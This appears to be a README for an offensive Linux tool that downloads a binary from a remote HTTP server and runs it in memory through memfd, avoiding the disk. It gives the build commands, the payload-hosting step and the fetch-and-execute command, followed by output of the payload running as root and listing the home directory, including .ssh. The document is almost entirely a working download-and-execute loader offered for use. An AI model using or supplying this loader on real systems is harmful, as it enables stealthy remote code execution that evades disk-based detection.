# Remote memfd Exec

Execute a remote binary directly in memory on Linux without writing to disk

## Build the payload and executor

```
env GOOS=linux GOARCH=amd64 go build payload.go
env GOOS=linux GOARCH=amd64 go build remote_memfd_exec.go
```

# Host the payload on a server

```
 python3 -m http.server
```


# Execute the remote payload in memory on the target

```
./remote_exec_memfd http://server:8000/payload                                                                     
Fetching binary from: http://server:8000/payload                                                                                          
Downloaded 2506798 bytes                                                                                                                    
Executing binary in memory...

========= Remote Execution Payload ========                                                                                             
Time: Sat, 01 Mar 2025 00:01:31 UTC                                                                                                         
Hostname: linode-recon-1                                                                                                                    
Username: root                                                                                                                              
OS: linux                                                                                                                                   
Architecture: amd64                                                                                                                         
==========================================   

                                                                                                                                            
Listing contents of current directory:                                                                                                      
- .bash_history (3604 bytes)                                                                                                                
- .bashrc (3181 bytes)                                                                                                                      
- .cache (4096 bytes)                                                                                                                       
- .config (4096 bytes)                                                                                                                      
- .lesshst (20 bytes)                                                                                                                       
- .pdtm (4096 bytes)                                                                                                                        
- .profile (290 bytes)                                                                                                                      
- .ssh (4096 bytes)                                                                                                                         
- .viminfo (2319 bytes)                                                                                                                     
- .wget-hsts (161 bytes)                                                                                                                    
- Data (4096 bytes)                                                                                                                         
- Repos (4096 bytes)                                                                                                                        
- Scripts (4096 bytes)                                                                                                                      
- StackScript (2012 bytes)                                                                                                                  
- Wordlists (4096 bytes)                                                                                                                    
- go (4096 bytes)                                                                                                                           
- remote_exec_memfd (7771188 bytes)                                                                                                         
- remote_exec_memfd.go (2221 bytes)                                                                                                         
                                                                                                                                            
Payload execution complete!                                                                                                                 
Execution completed 
```